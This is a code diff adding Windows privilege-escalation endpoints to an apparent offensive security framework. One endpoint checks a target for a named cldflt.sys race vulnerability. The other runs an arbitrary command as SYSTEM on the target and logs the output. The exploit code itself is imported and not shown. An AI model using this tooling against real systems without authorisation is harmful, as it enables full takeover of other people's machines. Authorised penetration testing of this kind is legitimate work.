@@ -5380,6 +5380,89 @@ def create_app(api: SAPMAPApi) -> Bottle:
         threading.Thread(target=_run, daemon=True).start()
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_windows_lpe", method="POST")
+    def node_check_windows_lpe(sid):
+        """Probe Windows LPE prerequisites on the target.  Currently
+        covers MiniPlasma (cldflt.sys race, CVE-2020-17103 silently
+        un-patched).  The auto-picker reports which technique is
+        viable + which it would select."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            _task_start(f"{sid}:check_windows_lpe",
+                        f"{sid}: checking Windows SYSTEM LPE")
+            try:
+                from sapmap_winlpe_auto import check_windows_lpe
+                res = check_windows_lpe(node)
+                method = res.get("method") or ""
+                mp = res.get("miniplasma") or {}
+                # One headline finding tagged with severity by viability.
+                sapmap_findings.emit_finding(
+                    "HIGH" if mp.get("vulnerable") else "INFO", sid,
+                    f"MiniPlasma (CVE-2020-17103 un-patched): "
+                    f"{'VULNERABLE' if mp.get('vulnerable') else 'not vulnerable'}"
+                    f" — Windows {mp.get('os_build', '?')} "
+                    f".NET {mp.get('net_version', '?')}. "
+                    f"{mp.get('reason', '')}",
+                    ref="lpe.miniplasma.check", meta=mp)
+                if method:
+                    sapmap_findings.emit_finding(
+                        "INFO", sid,
+                        f"Auto-picker selected: {method}.  "
+                        f"{res.get('summary','')}",
+                        ref="lpe.windows.method")
+            except Exception as e:
+                print(f"[-] {sid}: check_windows_lpe error: {e}")
+            finally:
+                _task_end(f"{sid}:check_windows_lpe")
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_windows_lpe", method="POST")
+    def node_exploit_windows_lpe(sid):
+        """Run a shell command as NT AUTHORITY\\SYSTEM using the best
+        available Windows LPE technique.  Currently MiniPlasma only —
+        future-proofed via the same picker shape as the Linux LPE
+        endpoint."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        command = data.get("command", "whoami")
+
+        def _run():
+            _task_start(f"{sid}:exploit_windows_lpe",
+                        f"{sid}: Windows LPE — running: {command}")
+            try:
+                from sapmap_winlpe_auto import run_windows_lpe
+                res = run_windows_lpe(node, command)
+                method = res.get("method") or "?"
+                if res.get("ok"):
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"SYSTEM obtained via {method} on {sid}.  "
+                        f"Command: {command!r}.  "
+                        f"Output: {res.get('stdout', '')[:200]}",
+                        ref=f"lpe.{method}.system_obtained",
+                        meta={"command": command,
+                              "method": method,
+                              "stdout": res.get("stdout", "")[:500]})
+                    print(f"[+] {sid}: {method} SYSTEM — output: "
+                          f"{res.get('stdout', '')[:300]!r}")
+                else:
+                    print(f"[-] {sid}: Windows LPE failed: "
+                          f"{res.get('error')}")
+            except Exception as e:
+                print(f"[-] {sid}: exploit_windows_lpe error: {e}")
+            finally:
+                _task_end(f"{sid}:exploit_windows_lpe")
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/exploit_linux_lpe", method="POST")
     @app.route("/api/node/<sid>/exploit_copyfail",  method="POST")  # legacy alias
     def node_exploit_linux_lpe(sid):
